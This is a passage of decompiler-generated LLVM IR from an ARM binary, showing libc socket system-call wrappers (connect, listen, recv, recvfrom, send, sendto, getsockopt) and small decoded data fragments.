  store i32 %v1_12b24, i32* %v4_12b28, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12b30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12b30

dec_label_pc_12b30:                               ; preds = %entry, %dec_label_pc_12b18
  %v1_12b34 = phi i32 [ %v0_12b08, %entry ], [ -1, %dec_label_pc_12b18 ]
  %v2_12b30 = phi i32 [ %v3_12afc, %entry ], [ %v2_12b30.pre, %dec_label_pc_12b18 ]
  store i32 %v2_12b30, i32* @r7, align 4
  ret i32 %v1_12b34

; uselistorder directives
  uselistorder i32 %v0_12b08, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12b30, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12b38:
  %v0_12b38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12b38, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12b38
  %v2_12b38 = load i32, i32* @sl, align 4
  %v8_12b38 = shl i32 %v2_12b38, %arg2
  %v9_12b38 = and i32 %v8_12b38, %arg1
  %v5_12b3c = sdiv i32 %v9_12b38, 1024
  %v6_12b3c = and i32 %v5_12b3c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12b38, %bb
  %v7_12b3c = phi i32 [ %arg1, %dec_label_pc_12b38 ], [ %v6_12b3c, %bb ]
  ret i32 %v7_12b3c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b40 = load i32, i32* @r7, align 4
  store i32 %v3_12b40, i32* %stack_var_-8, align 4
  %v0_12b4c = load i32, i32* @r0, align 4
  store i32 %v0_12b4c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12b4c, -4095
  br i1 %tmp, label %dec_label_pc_12b74, label %dec_label_pc_12b5c

dec_label_pc_12b5c:                               ; preds = %entry
  %v0_12b60 = call i32 @__aeabi_read_tp()
  %v3_12b64 = load i16, i16* @global_var_23068.363, align 2
  %v4_12b64 = sext i16 %v3_12b64 to i32
  store i32 %v4_12b64, i32* @r3, align 4
  %v0_12b68 = load i32, i32* %r2.global-to-local, align 4
  %v1_12b68 = sub i32 0, %v0_12b68
  store i32 %v1_12b68, i32* %r2.global-to-local, align 4
  %v3_12b6c = add i32 %v4_12b64, %v0_12b60
  %v4_12b6c = inttoptr i32 %v3_12b6c to i32*
  store i32 %v1_12b68, i32* %v4_12b6c, align 4
  %v2_12b74.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12b74

dec_label_pc_12b74:                               ; preds = %entry, %dec_label_pc_12b5c
  %v1_12b78 = phi i32 [ %v0_12b4c, %entry ], [ -1, %dec_label_pc_12b5c ]
  %v2_12b74 = phi i32 [ %v3_12b40, %entry ], [ %v2_12b74.pre, %dec_label_pc_12b5c ]
  store i32 %v2_12b74, i32* @r7, align 4
  ret i32 %v1_12b78

; uselistorder directives
  uselistorder i32 %v0_12b4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12b74, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_12b7c:
  %v0_12b7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12b7c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12b7c
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_12b7c = load i32, i32* @fp, align 4
  %v8_12b7c = shl i32 %v2_12b7c, %tmp
  %v9_12b7c = and i32 %v8_12b7c, %arg1
  store i32 %v9_12b7c, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12b7c, %bb
  %v8_12b80 = phi i32 [ %arg1, %dec_label_pc_12b7c ], [ %v9_12b7c, %bb ]
  ret i32 %v8_12b80

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12b88 = load i32, i32* @r4, align 4
  store i32 %v3_12b88, i32* %stack_var_-20, align 4
  %v6_12b88 = load i32, i32* @r5, align 4
  %v9_12b88 = load i32, i32* @r6, align 4
  %v12_12b88 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r3, align 4
  %v4_12b94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12772) to i32*), align 4
  store i32 %v4_12b94, i32* @ip, align 4
  %v2_12b98 = icmp eq i32 %v4_12b94, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_12b98, label %dec_label_pc_12bb0, label %entry.dec_label_pc_12bbc_crit_edge

entry.dec_label_pc_12bbc_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12bbc

dec_label_pc_12bb0:                               ; preds = %entry
  store i32 %v3_12b88, i32* @r4, align 4
  store i32 %v9_12b88, i32* @r6, align 4
  store i32 %v12_12b88, i32* @r7, align 4
  %v0_12bb8 = call i32 @__sys_connect()
  br label %dec_label_pc_12bbc

dec_label_pc_12bbc:                               ; preds = %entry.dec_label_pc_12bbc_crit_edge, %dec_label_pc_12bb0
  %v0_12bbc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12bbc, i32* @r5, align 4
  %v0_12bcc = load i32, i32* @r4, align 4
  store i32 %v0_12bcc, i32* @r0, align 4
  %v0_12bd0 = call i32 @__sys_connect()
  store i32 %v0_12bd0, i32* @r4, align 4
  %v0_12bd8 = load i32, i32* @r5, align 4
  %v1_12bdc = call i32 @__libc_disable_asynccancel(i32 %v0_12bd8)
  %v0_12be0 = load i32, i32* @r4, align 4
  %v2_12be8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12be8, i32* @r4, align 4
  store i32 %v6_12b88, i32* @r5, align 4
  store i32 %v9_12b88, i32* @r6, align 4
  store i32 %v12_12b88, i32* @r7, align 4
  ret i32 %v0_12be0

; uselistorder directives
  uselistorder label %dec_label_pc_12bbc, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12bf8 = load i32, i32* @r7, align 4
  store i32 %v3_12bf8, i32* %stack_var_-8, align 4
  %v0_12c04 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c04, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c04, -4095
  br i1 %tmp, label %dec_label_pc_12c2c, label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %entry
  %v0_12c18 = call i32 @__aeabi_read_tp()
  %v3_12c1c = load i16, i16* @global_var_23068.363, align 2
  %v4_12c1c = sext i16 %v3_12c1c to i32
  %v0_12c20 = load i32, i32* %r2.global-to-local, align 4
  %v1_12c20 = sub i32 0, %v0_12c20
  store i32 %v1_12c20, i32* %r2.global-to-local, align 4
  %v3_12c24 = add i32 %v4_12c1c, %v0_12c18
  %v4_12c24 = inttoptr i32 %v3_12c24 to i32*
  store i32 %v1_12c20, i32* %v4_12c24, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12c2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12c2c

dec_label_pc_12c2c:                               ; preds = %entry, %dec_label_pc_12c14
  %v1_12c30 = phi i32 [ %v0_12c04, %entry ], [ -1, %dec_label_pc_12c14 ]
  %v2_12c2c = phi i32 [ %v3_12bf8, %entry ], [ %v2_12c2c.pre, %dec_label_pc_12c14 ]
  store i32 %v2_12c2c, i32* @r7, align 4
  ret i32 %v1_12c30

; uselistorder directives
  uselistorder i32 %v0_12c04, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c2c, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12c34:
  %v0_12c34 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12c34, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12c34
  %v2_12c38 = load i32, i32* @r4, align 4
  %v5_12c38 = sdiv i32 %v2_12c38, 256
  %v6_12c38 = and i32 %v5_12c38, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12c34, %bb
  %v7_12c38 = phi i32 [ %arg1, %dec_label_pc_12c34 ], [ %v6_12c38, %bb ]
  ret i32 %v7_12c38

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12c3c = load i32, i32* @r4, align 4
  store i32 %v3_12c3c, i32* %stack_var_-12, align 4
  %v0_12c4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c4c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c4c, -4095
  br i1 %tmp, label %dec_label_pc_12c74, label %dec_label_pc_12c5c

dec_label_pc_12c5c:                               ; preds = %entry
  %v0_12c60 = call i32 @__aeabi_read_tp()
  %v3_12c64 = load i16, i16* @global_var_23068.363, align 2
  %v4_12c64 = sext i16 %v3_12c64 to i32
  %v0_12c68 = load i32, i32* %r2.global-to-local, align 4
  %v1_12c68 = sub i32 0, %v0_12c68
  store i32 %v1_12c68, i32* %r2.global-to-local, align 4
  %v3_12c6c = add i32 %v4_12c64, %v0_12c60
  %v4_12c6c = inttoptr i32 %v3_12c6c to i32*
  store i32 %v1_12c68, i32* %v4_12c6c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12c74.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12c74

dec_label_pc_12c74:                               ; preds = %entry, %dec_label_pc_12c5c
  %v1_12c78 = phi i32 [ %v0_12c4c, %entry ], [ -1, %dec_label_pc_12c5c ]
  %v2_12c74 = phi i32 [ %v3_12c3c, %entry ], [ %v2_12c74.pre, %dec_label_pc_12c5c ]
  store i32 %v2_12c74, i32* @r4, align 4
  ret i32 %v1_12c78

; uselistorder directives
  uselistorder i32 %v0_12c4c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c74, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_12c7c:
  %v0_12c7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12c7c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12c7c
  %v2_12c7c = load i32, i32* @r7, align 4
  %v5_12c7c = udiv i32 %v2_12c7c, 4
  %v6_12c7c = and i32 %v5_12c7c, %arg1
  store i32 %v6_12c7c, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12c7c, %bb
  %v8_12c80 = phi i32 [ %arg1, %dec_label_pc_12c7c ], [ %v6_12c7c, %bb ]
  ret i32 %v8_12c80

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c84 = load i32, i32* @r7, align 4
  store i32 %v3_12c84, i32* %stack_var_-8, align 4
  %v0_12c90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c90, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c90, -4095
  br i1 %tmp, label %dec_label_pc_12cb8, label %dec_label_pc_12ca0

dec_label_pc_12ca0:                               ; preds = %entry
  %v0_12ca4 = call i32 @__aeabi_read_tp()
  %v3_12ca8 = load i16, i16* @global_var_23068.363, align 2
  %v4_12ca8 = sext i16 %v3_12ca8 to i32
  %v0_12cac = load i32, i32* %r2.global-to-local, align 4
  %v1_12cac = sub i32 0, %v0_12cac
  store i32 %v1_12cac, i32* %r2.global-to-local, align 4
  %v3_12cb0 = add i32 %v4_12ca8, %v0_12ca4
  %v4_12cb0 = inttoptr i32 %v3_12cb0 to i32*
  store i32 %v1_12cac, i32* %v4_12cb0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12cb8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12cb8

dec_label_pc_12cb8:                               ; preds = %entry, %dec_label_pc_12ca0
  %v1_12cbc = phi i32 [ %v0_12c90, %entry ], [ -1, %dec_label_pc_12ca0 ]
  %v2_12cb8 = phi i32 [ %v3_12c84, %entry ], [ %v2_12cb8.pre, %dec_label_pc_12ca0 ]
  store i32 %v2_12cb8, i32* @r7, align 4
  ret i32 %v1_12cbc

; uselistorder directives
  uselistorder i32 %v0_12c90, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12cb8, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12cc4 = load i32, i32* @r7, align 4
  store i32 %v3_12cc4, i32* %stack_var_-8, align 4
  %v0_12cd0 = load i32, i32* @r0, align 4
  store i32 %v0_12cd0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12cd0, -4095
  br i1 %tmp, label %dec_label_pc_12cf8, label %dec_label_pc_12ce0

dec_label_pc_12ce0:                               ; preds = %entry
  %v0_12ce4 = call i32 @__aeabi_read_tp()
  %v3_12ce8 = load i16, i16* @global_var_23068.363, align 2
  %v4_12ce8 = sext i16 %v3_12ce8 to i32
  %v0_12cec = load i32, i32* %r2.global-to-local, align 4
  %v1_12cec = sub i32 0, %v0_12cec
  store i32 %v1_12cec, i32* %r2.global-to-local, align 4
  %v3_12cf0 = add i32 %v4_12ce8, %v0_12ce4
  %v4_12cf0 = inttoptr i32 %v3_12cf0 to i32*
  store i32 %v1_12cec, i32* %v4_12cf0, align 4
  %v2_12cf8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12cf8

dec_label_pc_12cf8:                               ; preds = %entry, %dec_label_pc_12ce0
  %v1_12cfc = phi i32 [ %v0_12cd0, %entry ], [ -1, %dec_label_pc_12ce0 ]
  %v2_12cf8 = phi i32 [ %v3_12cc4, %entry ], [ %v2_12cf8.pre, %dec_label_pc_12ce0 ]
  store i32 %v2_12cf8, i32* @r7, align 4
  ret i32 %v1_12cfc

; uselistorder directives
  uselistorder i32 %v0_12cd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12cf8, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12d00:
  %v0_12d00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12d00, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12d00
  %v2_12d04 = load i32, i32* @r8, align 4
  %v4_12d04 = lshr i32 %v2_12d04, %arg3
  %v5_12d04 = sub i32 32, %arg3
  %v6_12d04 = shl i32 %v2_12d04, %v5_12d04
  %v7_12d04 = or i32 %v6_12d04, %v4_12d04
  %v9_12d04 = and i32 %v7_12d04, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12d00, %bb
  %v10_12d04 = phi i32 [ %arg1, %dec_label_pc_12d00 ], [ %v9_12d04, %bb ]
  ret i32 %v10_12d04

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12d0c = load i32, i32* @r4, align 4
  store i32 %v3_12d0c, i32* %stack_var_-24, align 4
  %v6_12d0c = load i32, i32* @r5, align 4
  %v9_12d0c = load i32, i32* @r6, align 4
  %v12_12d0c = load i32, i32* @r7, align 4
  %v15_12d0c = load i32, i32* @r8, align 4
  %v18_12d0c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @ip, align 4
  %v4_12d18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12772) to i32*), align 4
  %v2_12d1c = icmp eq i32 %v4_12d18, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12d1c, label %dec_label_pc_12d34, label %entry.dec_label_pc_12d3c_crit_edge

entry.dec_label_pc_12d3c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12d3c

dec_label_pc_12d34:                               ; preds = %entry
  store i32 %v3_12d0c, i32* @r4, align 4
  store i32 %v9_12d0c, i32* @r6, align 4
  store i32 %v12_12d0c, i32* @r7, align 4
  store i32 %v15_12d0c, i32* @r8, align 4
  %v0_12d38 = call i32 @__sys_recv()
  br label %dec_label_pc_12d3c

dec_label_pc_12d3c:                               ; preds = %entry.dec_label_pc_12d3c_crit_edge, %dec_label_pc_12d34
  %v0_12d3c = call i32 @__libc_enable_asynccancel()
  %v0_12d40 = load i32, i32* @r6, align 4
  store i32 %v0_12d40, i32* @r1, align 4
  store i32 %v0_12d3c, i32* @r5, align 4
  %v0_12d50 = load i32, i32* @r4, align 4
  store i32 %v0_12d50, i32* @r0, align 4
  %v0_12d54 = call i32 @__sys_recv()
  store i32 %v0_12d54, i32* @r4, align 4
  %v0_12d5c = load i32, i32* @r5, align 4
  %v1_12d60 = call i32 @__libc_disable_asynccancel(i32 %v0_12d5c)
  %v0_12d64 = load i32, i32* @r4, align 4
  %v2_12d68 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12d68, i32* @r4, align 4
  store i32 %v6_12d0c, i32* @r5, align 4
  store i32 %v9_12d0c, i32* @r6, align 4
  store i32 %v12_12d0c, i32* @r7, align 4
  store i32 %v15_12d0c, i32* @r8, align 4
  store i32 %v18_12d0c, i32* @lr, align 4
  ret i32 %v0_12d64

; uselistorder directives
  uselistorder label %dec_label_pc_12d3c, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12d78 = load i32, i32* @r4, align 4
  store i32 %v3_12d78, i32* %stack_var_-16, align 4
  %v0_12d8c = load i32, i32* @r0, align 4
  store i32 %v0_12d8c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12d8c, -4095
  br i1 %tmp, label %dec_label_pc_12db4, label %dec_label_pc_12d9c

dec_label_pc_12d9c:                               ; preds = %entry
  %v0_12da0 = call i32 @__aeabi_read_tp()
  %v3_12da4 = load i16, i16* @global_var_23068.363, align 2
  %v4_12da4 = sext i16 %v3_12da4 to i32
  %v0_12da8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12da8 = sub i32 0, %v0_12da8
  store i32 %v1_12da8, i32* %r2.global-to-local, align 4
  %v3_12dac = add i32 %v4_12da4, %v0_12da0
  %v4_12dac = inttoptr i32 %v3_12dac to i32*
  store i32 %v1_12da8, i32* %v4_12dac, align 4
  %v2_12db4.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12db4

dec_label_pc_12db4:                               ; preds = %entry, %dec_label_pc_12d9c
  %v1_12db8 = phi i32 [ %v0_12d8c, %entry ], [ -1, %dec_label_pc_12d9c ]
  %v2_12db4 = phi i32 [ %v3_12d78, %entry ], [ %v2_12db4.pre, %dec_label_pc_12d9c ]
  store i32 %v2_12db4, i32* @r4, align 4
  ret i32 %v1_12db8

; uselistorder directives
  uselistorder i32 %v0_12d8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12db4, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12dc0 = load i32, i32* @r4, align 4
  store i32 %v3_12dc0, i32* %stack_var_-32, align 4
  %v6_12dc0 = load i32, i32* @r5, align 4
  %v9_12dc0 = load i32, i32* @r6, align 4
  %v12_12dc0 = load i32, i32* @r7, align 4
  %v15_12dc0 = load i32, i32* @r8, align 4
  %v18_12dc0 = load i32, i32* @sb, align 4
  %v21_12dc0 = load i32, i32* @sl, align 4
  %v24_12dc0 = load i32, i32* @lr, align 4
  %v4_12dd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12772) to i32*), align 4
  %v2_12dd8 = icmp eq i32 %v4_12dd0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12dd8, label %dec_label_pc_12df8, label %dec_label_pc_12e04

dec_label_pc_12df8:                               ; preds = %entry
  store i32 %v3_12dc0, i32* @r4, align 4
  store i32 %v12_12dc0, i32* @r7, align 4
  store i32 %v15_12dc0, i32* @r8, align 4
  store i32 %v18_12dc0, i32* %sb.global-to-local, align 4
  %v0_12e00 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_12e04

dec_label_pc_12e04:                               ; preds = %entry, %dec_label_pc_12df8
  %v0_12e04 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12e04, i32* @r5, align 4
  %v0_12e18 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12e18, i32* @r0, align 4
  %v0_12e20 = call i32 @__sys_recvfrom()
  store i32 %v0_12e20, i32* @r4, align 4
  %v0_12e28 = load i32, i32* @r5, align 4
  %v1_12e2c = call i32 @__libc_disable_asynccancel(i32 %v0_12e28)
  %v0_12e30 = load i32, i32* @r4, align 4
  %v2_12e38 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12e38, i32* @r4, align 4
  store i32 %v6_12dc0, i32* @r5, align 4
  store i32 %v9_12dc0, i32* @r6, align 4
  store i32 %v12_12dc0, i32* @r7, align 4
  store i32 %v15_12dc0, i32* @r8, align 4
  store i32 %v18_12dc0, i32* @sb, align 4
  store i32 %v21_12dc0, i32* @sl, align 4
  store i32 %v24_12dc0, i32* @lr, align 4
  ret i32 %v0_12e30

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e04, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e48 = load i32, i32* @r7, align 4
  store i32 %v3_12e48, i32* %stack_var_-8, align 4
  %v0_12e54 = load i32, i32* @r0, align 4
  store i32 %v0_12e54, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e54, -4095
  br i1 %tmp, label %dec_label_pc_12e7c, label %dec_label_pc_12e64

dec_label_pc_12e64:                               ; preds = %entry
  %v0_12e68 = call i32 @__aeabi_read_tp()
  %v3_12e6c = load i16, i16* @global_var_23068.363, align 2
  %v4_12e6c = sext i16 %v3_12e6c to i32
  store i32 %v4_12e6c, i32* @r3, align 4
  %v0_12e70 = load i32, i32* %r2.global-to-local, align 4
  %v1_12e70 = sub i32 0, %v0_12e70
  store i32 %v1_12e70, i32* %r2.global-to-local, align 4
  %v3_12e74 = add i32 %v4_12e6c, %v0_12e68
  %v4_12e74 = inttoptr i32 %v3_12e74 to i32*
  store i32 %v1_12e70, i32* %v4_12e74, align 4
  %v2_12e7c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e7c

dec_label_pc_12e7c:                               ; preds = %entry, %dec_label_pc_12e64
  %v1_12e80 = phi i32 [ %v0_12e54, %entry ], [ -1, %dec_label_pc_12e64 ]
  %v2_12e7c = phi i32 [ %v3_12e48, %entry ], [ %v2_12e7c.pre, %dec_label_pc_12e64 ]
  store i32 %v2_12e7c, i32* @r7, align 4
  ret i32 %v1_12e80

; uselistorder directives
  uselistorder i32 %v0_12e54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e7c, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_12e84:
  %v0_12e84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e84, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12e84
  %tmp = ptrtoint i32* %arg2 to i32
  %v5_12e84 = udiv i32 %tmp, 4
  %v6_12e84 = and i32 %v5_12e84, %arg1
  store i32 %v6_12e84, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12e84, %bb
  %v8_12e88 = phi i32 [ %arg1, %dec_label_pc_12e84 ], [ %v6_12e84, %bb ]
  ret i32 %v8_12e88

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12e90 = load i32, i32* @r4, align 4
  store i32 %v3_12e90, i32* %stack_var_-24, align 4
  %v6_12e90 = load i32, i32* @r5, align 4
  %v9_12e90 = load i32, i32* @r6, align 4
  %v12_12e90 = load i32, i32* @r7, align 4
  %v15_12e90 = load i32, i32* @r8, align 4
  %v18_12e90 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @ip, align 4
  %v4_12e9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12772) to i32*), align 4
  %v2_12ea0 = icmp eq i32 %v4_12e9c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12ea0, label %dec_label_pc_12eb8, label %entry.dec_label_pc_12ec0_crit_edge

entry.dec_label_pc_12ec0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12ec0

dec_label_pc_12eb8:                               ; preds = %entry
  store i32 %v3_12e90, i32* @r4, align 4
  store i32 %v9_12e90, i32* @r6, align 4
  store i32 %v12_12e90, i32* @r7, align 4
  store i32 %v15_12e90, i32* @r8, align 4
  %v0_12ebc = call i32 @__sys_send()
  br label %dec_label_pc_12ec0

dec_label_pc_12ec0:                               ; preds = %entry.dec_label_pc_12ec0_crit_edge, %dec_label_pc_12eb8
  %v0_12ec0 = call i32 @__libc_enable_asynccancel()
  %v0_12ec4 = load i32, i32* @r6, align 4
  store i32 %v0_12ec4, i32* @r1, align 4
  store i32 %v0_12ec0, i32* @r5, align 4
  %v0_12ed0 = load i32, i32* @r8, align 4
  store i32 %v0_12ed0, i32* @r3, align 4
  %v0_12ed4 = load i32, i32* @r4, align 4
  store i32 %v0_12ed4, i32* @r0, align 4
  %v0_12ed8 = call i32 @__sys_send()
  store i32 %v0_12ed8, i32* @r4, align 4
  %v0_12ee0 = load i32, i32* @r5, align 4
  %v1_12ee4 = call i32 @__libc_disable_asynccancel(i32 %v0_12ee0)
  %v0_12ee8 = load i32, i32* @r4, align 4
  %v2_12eec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12eec, i32* @r4, align 4
  store i32 %v6_12e90, i32* @r5, align 4
  store i32 %v9_12e90, i32* @r6, align 4
  store i32 %v12_12e90, i32* @r7, align 4
  store i32 %v15_12e90, i32* @r8, align 4
  store i32 %v18_12e90, i32* @lr, align 4
  ret i32 %v0_12ee8

; uselistorder directives
  uselistorder label %dec_label_pc_12ec0, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12efc = load i32, i32* @r4, align 4
  store i32 %v3_12efc, i32* %stack_var_-16, align 4
  %v0_12f10 = load i32, i32* @r0, align 4
  store i32 %v0_12f10, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12f10, -4095
  br i1 %tmp, label %dec_label_pc_12f38, label %dec_label_pc_12f20

dec_label_pc_12f20:                               ; preds = %entry
  %v0_12f24 = call i32 @__aeabi_read_tp()
  %v3_12f28 = load i16, i16* @global_var_23068.363, align 2
  %v4_12f28 = sext i16 %v3_12f28 to i32
  %v0_12f2c = load i32, i32* %r2.global-to-local, align 4
  %v1_12f2c = sub i32 0, %v0_12f2c
  store i32 %v1_12f2c, i32* %r2.global-to-local, align 4
  %v3_12f30 = add i32 %v4_12f28, %v0_12f24
  %v4_12f30 = inttoptr i32 %v3_12f30 to i32*
  store i32 %v1_12f2c, i32* %v4_12f30, align 4
